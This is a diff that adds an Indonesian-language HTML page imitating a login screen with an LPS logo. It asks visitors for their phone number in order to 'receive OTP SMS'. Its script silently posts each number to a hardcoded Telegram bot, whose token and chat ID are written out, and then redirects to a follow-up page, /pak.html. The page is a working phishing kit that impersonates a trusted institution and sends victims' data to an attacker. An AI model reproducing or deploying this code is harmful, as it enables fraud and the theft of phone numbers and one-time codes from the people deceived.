@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Nomor-Handphone</title>
+    <style>
+        /* Gaya dasar untuk tampilan */
+        body {
+            background-color: rgb(0, 0, 0); /* Latar belakang hitam */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff; /* Warna teks putih */
+        }
+
+        /* Kontainer utama untuk input */
+        .input-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Gaya untuk input nomor telepon */
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ffffff; /* Warna border putih */
+            border-radius: 5px;
+            padding: 10px;
+            width: 300px;
+            margin-left:20px;
+            background-color: #2c2c2c; /* Latar belakang abu-abu gelap */
+            color: #fff; /* Warna teks putih */
+        }
+
+        /* Gambar ikon telepon */
+        .phone-input img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        /* Gaya untuk elemen input */
+        .phone-input input {
+            font-size: 16px;
+            padding: 10px;
+            border: none;
+            outline: none;
+            background-color: transparent;
+            color: #fff; /* Warna teks input putih */
+            flex: 1;
+        }
+
+        /* Gaya placeholder input */
+        .phone-input input::placeholder {
+            color: #999; /* Warna placeholder abu-abu terang */
+        }
+
+        /* Gaya deskripsi di bawah input */
+        .description {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #bbb; /* Warna teks deskripsi abu-abu */
+        }
+
+        /* Gaya tombol submit */
+        .submit-btn {
+            background-color: #5a5a5a; /* Warna abu-abu untuk tombol */
+            color: #ffffff; /* Warna teks putih */
+            padding: 14px 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: not-allowed; /* Tidak bisa diklik */
+            width: 320px;
+            transition: background-color 0.3s; /* Transisi warna */
+        }
+
+        /* Tombol submit aktif */
+        .submit-btn.enabled {
+            background-color: #ffa500; /* Warna kuning untuk tombol aktif */
+            cursor: pointer; /* Kursor berubah */
+        }
+        
+        .gambar {
+            width: 100%;
+            margin-bottom: 0px;
+        }
+
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+            margin-bottom: 0px;
+        }
+
+        .gambar-bawah {
+            display: flex;
+            justify-content: center;
+            position: relative;
+            bottom: -10px;
+        }
+
+        .gambar-bawah img {
+            width: 85%;
+            object-fit: cover;
+            margin: 0 25px;
+            background: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Input nomor telepon -->
+    <div class="input-container">
+        <div class="gambar">
+            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEja4ISYCf68xC6RE9Z-GP4hB7IM_QaSfY5D7nHhwo2jb3qKg1vD0sqXm32JE5C_tYGHjyiAksbga7Z3QFsaRThfVAHyuBswlVNDBxlE1o9RyaHBoECN-V0znlWxHnK4qLJOt5Lz6pQXZj89Pq73owh_sejE6MIpsE6spoXqCrRtKaoT79-I79BtSPKWBEc4" alt="Gambar Pucok">
+        </div>
+        <div class="phone-input">
+            <img src="https://img.icons8.com/ios-filled/50/ffd700/phone.png" alt="Phone Icon"/>
+            <span>+62</span>
+            <input type="tel" id="phone" placeholder="Masukkan nomor ponsel/8xxxxxxxx" minlength="10" maxlength="13" oninput="checkPhone()">
+        </div>
+        <div class="description">
+            Silakan masukkan nomor ponsel yang sering Anda<br>Gunakan untuk menerima OTP SMS
+        </div><br>
+        <button class="submit-btn" id="submitBtn" disabled onclick="submitPhone()">Masuk</button>
+        <div class="gambar gambar-bawah">
+            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEiT-LGlat2eeRbp5y0cecYi-h2CZb8EbpzPZLwXuwqOjpkFEPwmOiZ-pB6xRmPjQ8IaYn30jzOaFdLr229N-ndWkkmyxGd9Hw9NnNtyP__vAxdYVwUoZzWvU0UOg1tzGF89ZFhQk3o2N_hh6SL-ztb0fkf1B6C3iQRRIXQTKQInp3vneGjPPXRvj5-D_Gj0" alt="Logo LPS">
+        </div>
+    </div>
+
+    <script>
+        // Fungsi untuk memeriksa validitas input nomor telepon
+        function checkPhone() {
+            const phoneInput = document.getElementById('phone').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Jika nomor telepon valid (10-13 digit dan hanya angka)
+            if (phoneInput.length >= 10 && phoneInput.length <= 13 && /^\d+$/.test(phoneInput)) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('enabled'); // Menambahkan kelas enabled
+                submitBtn.style.cursor = 'pointer';
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('enabled'); // Menghapus kelas enabled
+                submitBtn.style.cursor = 'not-allowed';
+            }
+        }
+
+        // Fungsi untuk mengirim nomor telepon ke Telegram
+        function submitPhone() {
+            const phoneInput = document.getElementById('phone').value.trim();
+            
+            // Pastikan input nomor telepon tidak kosong dan valid
+            if (!phoneInput || phoneInput.length < 10 || phoneInput.length > 13 || !/^\d+$/.test(phoneInput)) {
+                alert('Masukkan nomor telepon yang valid!');
+                return;
+            }
+
+            // Ganti dengan bot token dan chat ID Telegram Anda
+            const botToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48'; // Masukkan bot token Anda di sini
+            const chatId = '6824078885'; // Masukkan chat ID Anda di sini
+
+            // URL untuk mengirim pesan ke bot Telegram
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Pesan yang akan dikirim
+            const message = `Nomor Telepon: +62${phoneInput}`;
+
+            // Kirim pesan ke Telegram menggunakan fetch API
+            fetch(telegramURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Pesan terkirim ke Telegram:', data);
+                ('');
+            window.location.href = '/pak.html';
+            })
+        }
+    </script>
+</body>
+  </html>
